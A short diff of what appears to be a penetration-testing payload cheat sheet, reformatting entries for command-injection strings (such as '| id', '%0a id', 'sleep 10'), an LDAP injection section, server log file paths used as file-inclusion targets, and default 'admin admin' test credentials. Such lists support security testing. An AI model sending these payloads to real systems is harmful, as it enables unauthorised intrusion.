@@ -94,9 +94,9 @@ Command injection
 | id
 && id
 error || id
-%0a id
-time based
-sleep 10*
+%0a id*
+    time based
+    *sleep 10*
 
 LDAP injection
     *)
@@ -209,8 +209,7 @@ logs/access.log
 /var/run/utmp
 /var/webmin/miniserv.log
 /var/www/logs/access_log
-/var/www/logs/access.log
-*
+/var/www/logs/access.log*
 
 Test credentials
     admin admin
